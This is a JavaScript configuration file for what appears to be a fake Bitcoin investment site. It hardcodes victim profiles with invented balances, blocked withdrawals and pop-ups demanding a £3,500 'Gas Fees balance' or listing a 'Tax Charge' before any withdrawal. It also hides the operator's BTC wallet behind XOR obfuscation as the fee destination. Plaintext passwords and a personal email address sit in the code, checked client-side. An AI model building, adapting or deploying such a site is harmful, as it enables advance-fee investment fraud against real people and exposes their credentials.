(function () {
  var env = window.ENV || {};

  function decodeWallet(encoded) {
    var key = "sv7x";
    var raw = atob(encoded);
    var out = "";
    for (var i = 0; i < raw.length; i++) {
      out += String.fromCharCode(raw.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return out;
  }

  // Encoded platform BTC wallet — regenerate with: python3 scripts/encode-wallet.py "bc1q..."
  var platformWallet = decodeWallet("ERUGCUEFThYJG05LCQ4ETgcHUx0dG0RKAQRHTUVPTQkYQUdLAAwOShQB");

  var balance = Number(env.balanceUsd);
  if (Number.isNaN(balance)) balance = 15500;

  var displayName = env.displayName || "Jerry McMillan";
  var platformName = env.platformName || "Investment Scheme";
  var initialDepositDate = env.initialDepositDate || "24/06/2026";
  var initialDepositCreatedAt = Number(env.initialDepositCreatedAt);
  if (Number.isNaN(initialDepositCreatedAt)) {
    initialDepositCreatedAt = new Date(2026, 5, 24).getTime();
  }

  var jerryCreds = {
    email: (env.loginEmail || "").trim(),
    password: env.loginPassword || "",
    username: (env.loginUsername || "").trim().toLowerCase()
  };

  var profiles = [
    {
      id: "jerry",
      displayName: displayName,
      username: jerryCreds.username || "",
      email: jerryCreds.email,
      password: jerryCreds.password,
      syncToken: "jry_sync_8f3k2m9x",
      balanceUsd: balance,
      currency: "USD",
      currencyLabel: "USD",
      asset: "BTC",
      stable: false,
      withdrawalsBlocked: true,
      depositsBlocked: false,
      withdrawModalBody: "Withdrawals are currently unavailable on your account. Please contact support for assistance.",
      withdrawFeeAmount: null,
      withdrawFeeCurrency: null,
      initialDeposit: {
        id: "initial-deposit",
        amountUsd: balance,
        date: initialDepositDate,
        createdAt: initialDepositCreatedAt,
        type: "Deposit",
        asset: "BTC",
        status: "Completed"
      }
    },
    {
      id: "lawson",
      displayName: "Lawson Spedding",
      username: "lawsonspedding",
      email: "lawsonspedding",
      password: "LawsonSpedding",
      syncToken: "lws_sync_4p7n1q6v",
      // 361,015.00 − 6,380.00 → 354,635.00
      balanceUsd: 354635,
      currency: "USDT",
      currencyLabel: "USDT",
      asset: "USDT",
      stable: true,
      stateVersion: "tax-v5",
      withdrawalsBlocked: true,
      depositsBlocked: true,
      withdrawModalTitle: "Withdrawal",
      withdrawModalBody: "Gas Fees balance of £3500 is required to enable withdrawal on your account",
      withdrawFeeAmount: 3500,
      withdrawFeeCurrency: "GBP",
      depositModalTitle: "Deposits Unavailable",
      depositModalBody: "Deposits are currently unavailable on your account. Please contact support for assistance.",
      initialDeposit: {
        id: "initial-deposit",
        amountUsd: 361015,
        date: "07/11/2026",
        createdAt: new Date(2026, 6, 11).getTime(),
        type: "Deposit",
        asset: "USDT",
        status: "Completed"
      },
      seedHistory: [
        {
          id: "tax-charge-2",
          seed: true,
          date: "07/22/2026",
          createdAt: new Date(2026, 6, 22).getTime(),
          completesAt: new Date(2026, 6, 22).getTime(),
          amountUsd: 6380,
          type: "Tax Charge",
          asset: "GBP",
          amount: "-£6,380.00",
          status: "Completed"
        }
      ]
    },
    {
      id: "sarah",
      displayName: "Gary",
      username: "sarahglancey99",
      email: "Sarahglancey99@gmail.com",
      password: "Sarah1234567",
      syncToken: "sar_sync_2h8k5w3z",
      balanceUsd: 23956,
      currency: "USD",
      currencyLabel: "USD",
      asset: "BTC",
      stable: true,
      stateVersion: "sarah-v2",
      seedTransactions: false,
      withdrawalsBlocked: false,
      depositsBlocked: false,
      withdrawFeeProof: true,
      withdrawFeeAmount: 455,
      withdrawFeeCurrency: "USD",
      withdrawFeeWallet: platformWallet,
      formSubmitEmail: "ronniechristopher89@gmail.com",
      withdrawCompleteWithinMs: 60 * 60 * 1000
    }
  ];

  window.SITE = {
    platformName: platformName,
    displayName: displayName,
    name: displayName,
    tagline: env.tagline || "Bitcoin Investment Platform",
    email: env.email || "support@plaidinvest.com",
    domain: "plaidinvest.online",
    year: 2026,
    btcPrice: 0,
    btcChange: 0,
    balanceUsd: balance,
    platformWallet: platformWallet,
    withdrawalFeeUsd: Number(env.withdrawalFeeUsd) || 500,
    withdrawalsBlocked: env.withdrawalsBlocked !== false,
    initialDeposit: profiles[0].initialDeposit,
    credentials: {
      email: jerryCreds.email,
      password: jerryCreds.password
    },
    profiles: profiles,
    images: {
      btc: "/assets/icons/btc.svg",
      btcPng: "/assets/icons/btc.png",
      usd: "/assets/icons/usd.svg",
      eth: "/assets/icons/eth.png",
      favicon: "/assets/favicon.svg"
    }
  };

  window.SITE.getProfileById = function (id) {
    var list = window.SITE.profiles || [];
    for (var i = 0; i < list.length; i++) {
      if (list[i].id === id) return list[i];
    }
    return list[0] || null;
  };

  window.SITE.findProfile = function (login, password) {
    var key = (login || "").trim().toLowerCase();
    var pass = password || "";
    var list = window.SITE.profiles || [];
    for (var i = 0; i < list.length; i++) {
      var p = list[i];
      var email = (p.email || "").trim().toLowerCase();
      var username = (p.username || "").trim().toLowerCase();
      if (!pass || pass !== p.password) continue;
      if (key && (key === email || (username && key === username))) return p;
    }
    return null;
  };

  Object.freeze(window.SITE.images);
})();
